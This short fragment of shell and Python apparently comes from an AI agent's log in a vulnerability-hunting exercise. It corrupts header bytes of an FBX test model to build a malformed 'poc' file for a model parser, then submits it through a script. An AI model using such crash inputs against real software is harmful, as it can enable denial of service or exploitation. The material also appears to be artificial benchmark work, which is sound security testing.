from pathlib import Path
p=Path('test/models-nonbsd/FBX/2013_BINARY/ConcavePolygon.fbx')
data=bytearray(p.read_bytes())
# search for ASCII 'FBXHeaderExtension' and duplicate a chunk around it to create malformed nesting
idx=data.find(b'FBXHeaderExtension')
print('idx',idx)
# mutate some bytes near first nested scope lengths to huge values? just flip bytes in header region
for off in [0x1c,0x20,0x24,0x28,0x2c,0x30]:
    if off < len(data): data[off]=0xff
out=Path('/workspace/poc2.bin')
out.write_bytes(data)
print(out.stat().st_size)
PY
cd /workspace && bash submit.sh /workspace/poc2.bin /workspace/analysis.json
